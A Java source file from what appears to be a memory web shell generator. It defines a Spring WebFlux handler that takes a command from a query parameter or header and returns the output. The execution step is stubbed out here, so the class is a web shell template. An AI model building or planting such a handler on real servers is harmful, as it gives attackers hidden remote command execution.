package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.web.reactive.function.server.HandlerFunction;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

import java.io.InputStream;
import java.util.Optional;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandHandlerFunction implements HandlerFunction<ServerResponse> {
    public static String paramName;

    @Override
    public Mono<ServerResponse> handle(ServerRequest request) {
        String p = null;
        Optional<String> paramOptional = request.queryParam(paramName);
        if (paramOptional.isPresent()) {
            p = paramOptional.get();
        }
        if (p == null || p.isEmpty()) {
            p = request.headers().firstHeader(paramName);
        }
        String result = "";
        try {
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                result = new Scanner(inputStream).useDelimiter("\\A").next();
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return ServerResponse.ok().body(Mono.just(result), String.class);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
